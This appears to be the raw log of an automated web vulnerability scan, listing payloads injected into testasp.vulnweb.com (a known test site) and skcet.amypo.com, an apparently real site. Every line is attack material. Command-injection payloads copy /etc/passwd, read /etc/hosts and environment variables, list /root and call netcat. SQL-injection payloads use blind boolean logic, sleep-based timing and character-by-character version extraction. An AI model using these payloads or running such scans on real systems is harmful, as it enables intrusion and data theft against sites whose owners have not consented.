URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: || rm -f /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || echo hello > /tmp/hello.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || mv /tmp/hello.txt /tmp/hello_moved.txt, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cp /etc/passwd /tmp/passwd_copy, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || find / -name passwd, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || history, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chmod 777 /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || chown root:root /tmp/testfile, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || mount, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || df -h, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ifconfig, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /proc/cpuinfo, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /home, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /root, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || cat /etc/hosts, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || env, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || hostname, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || ls /var/log, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ; nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: | nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: && nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: || nc -nv 127.0.0.1 1234, Type: Command Injection, Indicator: No Indicator, Vulnerable: False
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: http://testasp.vulnweb.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: True
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 30, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ORDER BY 31337, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='S', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8310 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: %' AND 8310=8311 AND '%'=', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: 1 or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='X', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,1,1))='M', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: ' or sleep(5)#, Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='i', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: " or sleep(5)=", Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,3,1))='c', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
URL: https://skcet.amypo.com/, Payload: and (select substring(@@version,2,1))='y', Type: SQL Injection, Indicator: SQL Error, Vulnerable: False
